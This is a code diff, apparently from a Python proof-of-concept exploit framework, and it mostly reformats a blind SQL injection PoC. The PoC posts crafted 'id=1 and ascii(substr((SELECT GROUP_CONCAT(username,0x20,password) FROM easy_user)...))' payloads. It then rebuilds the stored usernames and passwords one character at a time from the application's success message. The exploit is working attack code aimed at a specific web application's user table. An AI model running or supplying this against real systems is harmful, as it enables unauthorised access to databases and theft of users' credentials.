@@ -1,5 +1,6 @@
-from lib.core.data import target
 import requests
+
+from lib.core.data import target
 
 
 def poc():
@@ -21,22 +22,26 @@ def poc():
         j = 1
         while j:
             for i in range(len(index)):
-                header = {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                }
+                header = {"Content-Type": "application/x-www-form-urlencoded"}
                 postData = "id=1 and ascii(substr(((SELECT GROUP_CONCAT(username,0x20,password) FROM easy_user))," + str(
-                    j) + ",1))%3d" + str(index[i]) + "&email=test%40test.com&sex=" + str(i + 100)
-                r = requests.post(url, headers=header, data=postData, cookies=cookies)
+                    j) + ",1))%3d" + str(
+                        index[i]) + "&email=test%40test.com&sex=" + str(
+                            i + 100)
+                r = requests.post(
+                    url, headers=header, data=postData, cookies=cookies)
 
-                if "\u66f4\u65b0\u6210\u529f".decode('unicode_escape') in r.text:
+                if "\u66f4\u65b0\u6210\u529f".decode(
+                        'unicode_escape') in r.text:
                     if index[i]:
                         result += chr(index[i])
                         j = j + 1
                         print("[*] Sql injecting: " + result)
                     else:
-                        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
+
                         print("[*] Get the username and password: " + result)
                         j = 0
                         break
     except KeyError as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
